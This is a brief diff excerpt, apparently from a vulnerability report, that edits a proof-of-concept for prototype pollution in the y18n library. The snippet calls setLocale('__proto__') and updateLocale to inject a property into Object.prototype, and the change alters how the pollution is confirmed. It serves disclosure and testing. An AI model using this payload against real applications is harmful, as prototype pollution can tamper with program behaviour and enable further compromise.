@@ -15,7 +15,7 @@ var obj = {}
 console.log("Before : " + obj.polluted);
 y18n.setLocale('__proto__');
 y18n.updateLocale({polluted: 'Yes! Its Polluted'});
-console.log("After : " + obj.polluted);
+console.log("After : " + {}.polluted);
 ```
 
 2. Execute the following commands in another terminal:
